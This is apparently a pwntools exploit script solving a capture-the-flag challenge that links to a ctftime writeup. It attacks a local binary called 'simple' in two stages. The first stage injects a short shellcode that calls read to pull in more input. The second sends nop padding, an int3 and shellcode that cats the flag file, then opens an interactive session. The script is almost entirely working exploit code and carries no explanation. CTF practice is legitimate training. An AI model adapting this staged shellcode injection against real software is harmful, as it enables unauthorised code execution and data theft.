# https://ctftime.org/writeup/20135

from pwn import *
from struct import pack
from sys import argv
from os import system


r = process("./simple")

shellcode = asm('''
push 1000
pop rdx
xor eax, eax
syscall
''', arch='amd64').ljust(10, '\x90')
r.sendline(shellcode)

shellcode = '\x90'*0x10 + \
asm('''
mov rax, 8
int3
''', arch='amd64') + \
asm(shellcraft.amd64.cat('flag'), arch='amd64')

r.sendline(shellcode)
r.interactive()